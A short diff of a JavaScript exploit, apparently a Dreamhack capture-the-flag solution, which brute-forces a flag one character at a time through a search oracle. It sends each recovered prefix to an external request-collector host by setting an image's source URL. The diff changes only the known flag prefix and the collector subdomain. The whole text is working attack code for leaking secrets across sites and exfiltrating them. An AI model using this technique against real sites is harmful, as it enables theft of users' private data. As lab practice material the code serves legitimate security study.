@@ -27,13 +27,13 @@
 
     async function exploit() {
         let chars = "0123456789abcdef}"
-        let secret = "/DH{22d1445ad68e1";
+        let secret = "/DH{22d1445ad68e";
 
         while (!secret.includes("}")) {
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://ftsnofl.request.dreamhack.games/${secret}`;
+                    img.src = `https://qieryju.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
